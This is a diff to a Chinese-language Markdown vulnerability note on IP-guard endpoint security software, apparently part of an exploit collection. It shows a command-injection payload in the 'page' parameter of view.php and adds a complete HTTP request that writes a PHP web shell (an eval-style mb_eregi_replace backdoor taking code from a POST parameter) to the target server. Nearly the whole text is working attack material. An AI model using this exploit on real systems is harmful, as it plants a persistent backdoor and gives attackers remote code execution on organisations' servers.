@@ -16,6 +16,16 @@ IP-guard是由溢信科技股份有限公司开发的一款终端安全管理软
 /ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20dnslog
 ```
 
+## 写php
+```
+GET /ipg/static/appr/lib/flexpaper/php/view.php?doc=1.jpg&format=swf&isSplit=true&page=||echo+^<?php+@mb_eregi_replace('.*',$_POST['a'],'','ee');?^>+>1.php HTTP/1.1
+Host: your-ip
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+```
+
 ## 漏洞复现
 
 ![](./assets/20231109165256.png)
